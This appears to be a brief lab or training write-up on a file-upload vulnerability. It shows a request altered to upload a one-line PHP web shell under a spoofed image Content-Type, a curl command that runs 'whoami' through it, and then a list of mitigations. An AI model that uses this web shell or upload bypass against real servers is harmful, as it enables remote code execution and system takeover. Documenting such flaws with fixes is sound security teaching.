# How

Intercept the POST request to upload the image and change the Content-Type
to `image/jpg` and the filename to end with `.php`:

```
Content-Disposition: form-data; name="uploaded"; filename="test.php"
Content-Type: image/jpg

<?php system($_REQUEST["cmd"]); ?>
```

If the uploaded file is stored accessible from the webserver, this could result
in remote code execution. Example assuming the uploaded file is stored in `/uploads`:

```
$ curl 'http://192.168.122.233/uploads/test.php?cmd=whoami'
www-data
```

# Fix

- Implement a whitelist of allowed extensions
- Check Content-Type + file extension + magic bytes
- Use existing libraries to handle file upload safely
